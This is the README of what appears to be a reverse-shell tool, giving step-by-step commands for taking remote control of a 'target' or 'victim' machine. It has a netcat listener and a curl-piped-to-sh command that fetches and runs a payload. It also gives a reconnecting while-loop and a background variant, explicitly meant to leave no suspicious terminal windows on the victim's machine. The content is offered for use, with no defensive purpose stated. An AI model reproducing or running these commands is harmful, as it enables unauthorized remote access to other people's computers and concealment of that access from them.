# reverse-shell
reverse shell in javascript


# 1. Usage:
- on your machine, open up your terminal and listen for connection you can do it using netcat

` nc -l 1337`

# 2.  Execute reverse shell on target:
- on the target machine, pipe the output of the http://localhost/yourip:port | sh

`curl http://localhost/yourip:port | sh`

# Reconnecting
- by default when the shell exist you lose you connection. you may do this by accident with an invalid command. You can easily create a shell that will attempt to reconnect by wrapping it in a while loop

`while true; do curl http://localhost/yourip:yourport | sh; done`

# Running as a background process
- the terminal session needs to kept open to persist the reverse shell connection. the following command will run the reverse shell in a background process and exit the termial, leaving no suspicious looking terminal windows open on the victim's machien

- Make sure you run this in a fresh terminal

` sh -c "curl http://localhost/yourip:yourport | sh -i &" && exit`
